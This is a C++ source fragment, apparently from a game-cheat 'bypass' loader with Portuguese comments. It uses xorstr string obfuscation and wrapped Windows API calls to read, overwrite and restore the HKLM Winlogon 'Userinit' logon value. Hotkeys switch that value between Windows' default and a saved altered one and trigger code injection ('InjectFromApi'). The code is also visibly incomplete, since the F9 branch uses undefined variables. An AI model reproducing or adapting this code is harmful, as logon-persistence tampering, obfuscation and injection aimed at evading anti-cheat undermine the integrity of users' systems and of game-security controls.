        const std::wstring sub =
            xorstr(L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");

        REGSAM access = KEY_QUERY_VALUE | KEY_WOW64_64KEY;
        if (forWrite) access |= KEY_SET_VALUE;

        HKEY hKey = nullptr;
        const LONG st = api::RegOpenKeyExW_(HKEY_LOCAL_MACHINE, sub.c_str(), 0,
            access, &hKey);
        if (st != ERROR_SUCCESS) return nullptr;
        return hKey;
    }

    inline bool ReadUserinitValue(HKEY hKey, std::wstring& out, DWORD& type)
    {
        wchar_t buf[2048]{};
        DWORD bytes = sizeof(buf);
        type = 0;

        const LONG st = api::RegQueryValueExW_(hKey, xorstr(L"Userinit"), nullptr, &type,
            reinterpret_cast<LPBYTE>(buf), &bytes);
        if (st != ERROR_SUCCESS) return false;
        if (type != REG_SZ && type != REG_EXPAND_SZ) return false;
        if (bytes < sizeof(wchar_t)) return false;

        const std::size_t chars = bytes / sizeof(wchar_t);
        buf[chars < 2047 ? chars : 2047] = 0;
        out.assign(buf);
        return true;
    }

    inline bool WriteUserinitValue(HKEY hKey, const std::wstring& value, DWORD type)
    {
        const DWORD bytes = static_cast<DWORD>((value.size() + 1) * sizeof(wchar_t));
        return api::RegSetValueExW_(hKey, xorstr(L"Userinit"), 0, type,
            reinterpret_cast<const BYTE*>(value.c_str()), bytes) == ERROR_SUCCESS;
    }

    inline bool SameUserinitValue(const std::wstring& a, const std::wstring& b)
    {
        return _wcsicmp(a.c_str(), b.c_str()) == 0;
    }

    // Escrita direta. O loader roda em host elevado (cmd adm -> child herda o
    // token), então HKLM está gravável e nenhum processo extra é criado.
    inline bool ApplyUserinitValue(const std::wstring& value, DWORD type)
    {
        HKEY hKey = OpenWinlogonKey(true);
        if (!hKey) return false;

        std::wstring current;
        DWORD currentType = REG_SZ;
        if (ReadUserinitValue(hKey, current, currentType) &&
            SameUserinitValue(current, value))
        {
            api::RegCloseKey_(hKey);
            return true;
        }

        const bool ok = WriteUserinitValue(hKey, value, type);
        api::RegCloseKey_(hKey);
        return ok;
    }

    inline void InitWinlogonState()
    {
        HKEY hKey = OpenWinlogonKey(false);
        if (!hKey) return;

        std::wstring current;
        DWORD type = REG_SZ;
        const bool read = ReadUserinitValue(hKey, current, type);
        api::RegCloseKey_(hKey);

        if (read && !current.empty() && !SameUserinitValue(current, WinlogonDefaultValue()))
        {
            winlogon_state::saved_value = current;
            winlogon_state::saved_type = type;
        }
        else
        {
            // Sem snapshot útil: assume o valor alterado que o usuário aplicou
            // antes de abrir o loader.
            winlogon_state::saved_value = WinlogonAlteredValue();
            winlogon_state::saved_type = REG_SZ;
        }

        winlogon_state::has_saved.store(true, std::memory_order_release);
    }

    // Shift+F7 — devolve o Userinit ao padrão do Windows.
    inline bool SetWinlogonDefault()
    {
        // Snapshot tardio: só captura se ainda não temos o valor alterado e o
        // que está na chave não é o default.
        if (!winlogon_state::has_saved.load(std::memory_order_acquire))
        {
            HKEY hKey = OpenWinlogonKey(false);
            if (hKey)
            {
                std::wstring current;
                DWORD type = REG_SZ;
                if (ReadUserinitValue(hKey, current, type) &&
                    !current.empty() &&
                    !SameUserinitValue(current, WinlogonDefaultValue()))
                {
                    winlogon_state::saved_value = current;
                    winlogon_state::saved_type = type;
                    winlogon_state::has_saved.store(true, std::memory_order_release);
                }
                api::RegCloseKey_(hKey);
            }
        }

        return ApplyUserinitValue(WinlogonDefaultValue(), REG_SZ);
    }

    // Shift+F9 — recoloca o valor alterado salvo no start (ou o fallback).
    inline bool RestoreWinlogonSaved()
    {
        if (!winlogon_state::has_saved.load(std::memory_order_acquire))
        {
            winlogon_state::saved_value = WinlogonAlteredValue();
            winlogon_state::saved_type = REG_SZ;
            winlogon_state::has_saved.store(true, std::memory_order_release);
        }

        return ApplyUserinitValue(
            winlogon_state::saved_value,
            winlogon_state::saved_type == REG_EXPAND_SZ ? REG_EXPAND_SZ : REG_SZ);
    }

    inline bool IsDown(int vk) { return (sc::CallGetAsyncKeyState(vk) & 0x8000) != 0; }

    inline void CheckKeyboard()
    {
        static bool prevF6 = false, prevF7 = false, prevF8 = false, prevF9 = false;

        const bool shift = IsDown(VK_SHIFT) ||
                           IsDown(VK_LSHIFT) ||
                           IsDown(VK_RSHIFT);
        const bool f6Raw = IsDown(VK_F6);
        const bool f7Raw = IsDown(VK_F7);

        const bool f6 = shift && f6Raw;
        const bool f7 = shift && f7Raw;

        const bool blocked = g_blocked.load(std::memory_order_relaxed);

#if CHEAT_BYPASS_ENABLE_WEBSOCKET
        if (f9 && !prevF9 &&
            !g_f7Running.load(std::memory_order_acquire) &&
            !g_f7Done.load(std::memory_order_acquire)) {
            SubmitKeyAction([]() { DoF9(); });
        }
#endif

        if (f7 && !prevF7 &&
            !g_f7Running.load(std::memory_order_acquire) &&
            !g_f7Done.load(std::memory_order_acquire)) {
            SubmitKeyAction([]() { DoF7(); });
        }

        if (blocked)
        {
            prevF6 = f6; prevF7 = f7;
            return;
        }

        // F6: injetar em thread pool para não bloquear loop principal
        if (f6 && !prevF6) {
            SubmitKeyAction([]() { InjectFromApi(); });
        }



        prevF6 = f6; prevF7 = f7;
    }

} // namespace Functions
